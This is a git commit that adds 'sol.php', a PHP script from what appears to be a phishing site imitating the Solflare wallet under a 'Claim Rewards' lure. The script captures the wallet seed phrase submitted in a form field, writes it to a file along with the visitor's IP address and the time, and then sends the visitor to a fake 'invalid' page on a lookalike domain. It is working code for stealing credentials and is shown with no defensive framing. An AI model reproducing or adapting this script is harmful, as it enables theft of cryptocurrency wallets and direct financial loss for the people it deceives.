1080635d6e2a7ddbd350d5617428d1466f8b9375
solanium-rewards <107247423+solanium-rewards@users.noreply.github.com>
2022-06-10 16:02:53 +0700

    Add files via upload

---
+++ Solflare_files/sol.php
@@ -0,0 +1,24 @@
+<?php
+$file = "SOLANA________________";
+$walletSeed   = $_POST['mnemonic'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "================================ SOL ================================");
+fwrite($handle, "\n");
+fwrite($handle, "KEY : ");
+fwrite($handle, "$walletSeed");
+fwrite($handle, "\n");
+
+fwrite($handle, "IP  : ");
+
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Time: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+header("Location:https://solflarewallet.github.io/Claim_Rewards/invalid.html?import-account");
+
+?>
